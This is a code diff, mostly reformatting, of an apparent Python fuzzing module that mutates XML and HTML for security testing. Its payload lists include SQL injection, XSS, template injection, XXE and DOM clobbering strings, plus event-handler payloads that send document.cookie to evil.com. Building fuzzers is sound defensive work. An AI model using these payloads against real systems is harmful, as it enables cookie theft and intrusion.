@@ -7,14 +7,11 @@ Implements syntactic boundary mutations for structured payloads
 from __future__ import annotations
 
 import copy
-import html.parser
 import json
 import random
 import re
-import signal
 import xml.etree.ElementTree as ET
 from abc import ABC, abstractmethod
-from io import StringIO
 from typing import Any
 
 # Maximum time allowed for a single regex operation (seconds).
@@ -158,6 +155,7 @@ class XMLASTMutator(BaseASTMutator):
     def mutate(self, base_xml: str) -> list[str]:
         """Generate syntactic mutations of the input XML string."""
         import xml.etree.ElementTree as ET
+
         try:
             root = ET.fromstring(base_xml)
         except ET.ParseError:
@@ -177,9 +175,12 @@ class XMLASTMutator(BaseASTMutator):
     def _mutate_text_values(self, node: Any) -> Any:
         """Replace element text values with boundary/injection values."""
         import xml.etree.ElementTree as ET
+
         if isinstance(node, ET.Element):
             if node.text and node.text.strip():
-                node.text = random.choice(["' OR '1'='1", "<script>alert(1)</script>", "null", "{{7*7}}"])
+                node.text = random.choice(
+                    ["' OR '1'='1", "<script>alert(1)</script>", "null", "{{7*7}}"]
+                )
             for child in node:
                 self._mutate_text_values(child)
         return node
@@ -187,6 +188,7 @@ class XMLASTMutator(BaseASTMutator):
     def _inject_attributes(self, node: Any) -> Any:
         """Inject or modify attributes on elements."""
         import xml.etree.ElementTree as ET
+
         if isinstance(node, ET.Element):
             injection_attrs = {
                 "xsi:nil": "true",
@@ -203,6 +205,7 @@ class XMLASTMutator(BaseASTMutator):
     def _nest_deeply(self, node: Any) -> Any:
         """Recursively nest a value to test parser stack limits."""
         import xml.etree.ElementTree as ET
+
         if isinstance(node, ET.Element):
             if list(node):
                 for child in node:
@@ -210,7 +213,9 @@ class XMLASTMutator(BaseASTMutator):
             if len(list(node)) > 0:
                 child = list(node)[0]
                 # Cap nesting to prevent O(n²) memory blow-up
-                max_depth = min(50, max(1, 50 - len(ET.tostring(node, encoding="unicode")) // 10000))
+                max_depth = min(
+                    50, max(1, 50 - len(ET.tostring(node, encoding="unicode")) // 10000)
+                )
                 wrapper = child
                 for _ in range(max_depth):
                     new_elem = ET.Element("n")
@@ -222,6 +227,7 @@ class XMLASTMutator(BaseASTMutator):
     def _inject_entities(self, node: Any) -> Any:
         """Inject XML entity references to test entity expansion (XXE)."""
         import xml.etree.ElementTree as ET
+
         if isinstance(node, ET.Element):
             # Add a comment with entity reference indicator
             node.text = (node.text or "") + "&xxe;"
@@ -234,6 +240,7 @@ class XMLASTMutator(BaseASTMutator):
     def _inject_xinclude(self, node: Any) -> Any:
         """Inject XInclude elements to test XML Inclusions."""
         import xml.etree.ElementTree as ET
+
         if isinstance(node, ET.Element):
             xi = ET.SubElement(node, "{http://www.w3.org/2001/XInclude}include")
             xi.set("parse", "text")
@@ -304,7 +311,7 @@ class HTMLASTMutator(BaseASTMutator):
 
     def _inject_script_tags(self, html: str, tags: list[dict[str, Any]]) -> str:
         """Inject <script> tags with XSS payloads."""
-        injection = '<script>alert(document.domain)</script>'
+        injection = "<script>alert(document.domain)</script>"
         # Insert after <head> or at the beginning
         head_end = html.find("</head>")
         if head_end != -1:
@@ -324,7 +331,7 @@ class HTMLASTMutator(BaseASTMutator):
     def _inject_event_handlers(self, html: str, tags: list[dict[str, Any]]) -> str:
         """Add event handler attributes to HTML elements."""
         result = _safe_re_sub(
-            r'(<(?:a|button|input|div|span)\b[^>]{0,5000})(/?>)',
+            r"(<(?:a|button|input|div|span)\b[^>]{0,5000})(/?>)",
             r'\1 onclick="fetch(\'https://evil.com/steal\')" \2',
             html,
             flags=re.IGNORECASE,
@@ -333,7 +340,6 @@ class HTMLASTMutator(BaseASTMutator):
 
     def _dom_clobber(self, html: str, tags: list[dict[str, Any]]) -> str:
         """Inject DOM clobbering payloads (id attributes that shadow global variables)."""
-        import re
         clobber_payloads = [
             '<img id="cookie" src="x" onerror="alert(1)">',
             '<a id="cookie" href="https://evil.com">click</a>',
@@ -383,7 +389,11 @@ class XMLASTMutator(BaseASTMutator):
         """Replace text content in XML elements with boundary values."""
         return _safe_re_sub(
             r">([^<]{0,10000})<",
-            lambda m: ">" + random.choice(["' OR '1'='1", "<script>alert(1)</script>", "null", "${7*7}", ""]) + "<",
+            lambda m: (
+                ">"
+                + random.choice(["' OR '1'='1", "<script>alert(1)</script>", "null", "${7*7}", ""])
+                + "<"
+            ),
             xml_str,
         )
 
@@ -426,7 +436,12 @@ class XMLASTMutator(BaseASTMutator):
         """Mutate XML attribute values."""
         return _safe_re_sub(
             r'(\w+)=["\']([^"\']{0,10000})["\']',
-            lambda m: m.group(1) + '="' + random.choice(["' OR '1'='1", "><script>", "", "null", "${7*7}"]) + '"',
+            lambda m: (
+                m.group(1)
+                + '="'
+                + random.choice(["' OR '1'='1", "><script>", "", "null", "${7*7}"])
+                + '"'
+            ),
             xml_str,
         )
 
@@ -466,7 +481,12 @@ class HTMLASTMutator(BaseASTMutator):
         """Replace attribute values with XSS probes."""
         return _safe_re_sub(
             r'(\w+)=["\']([^"\']{0,10000})["\']',
-            lambda m: m.group(1) + '="' + random.choice(["javascript:alert(1)", "'';!--\"<XSS>=&{()}"]) + '"',
+            lambda m: (
+                m.group(1)
+                + '="'
+                + random.choice(["javascript:alert(1)", "'';!--\"<XSS>=&{()}"])
+                + '"'
+            ),
             html_str,
         )
 
@@ -475,6 +495,7 @@ class HTMLASTMutator(BaseASTMutator):
         events = ["onload", "onerror", "onclick", "onfocus", "onmouseover", "onchange"]
         handlers = ["alert(1)", "fetch('https://evil.com/?'+document.cookie)"]
         tag_pattern = re.compile(r"(<\s*\w+[^>]{0,5000})>")
+
         def _inject(m: re.Match) -> str:
             tag = m.group(1)
             if any(ev.split("=")[0] in tag for ev in events):
@@ -482,6 +503,7 @@ class HTMLASTMutator(BaseASTMutator):
             event = random.choice(events)
             handler = random.choice(handlers)
             return f'{tag} {event}="{handler}">'
+
         return tag_pattern.sub(_inject, html_str)
 
     def _deeply_nest(self, html_str: str) -> str | None:
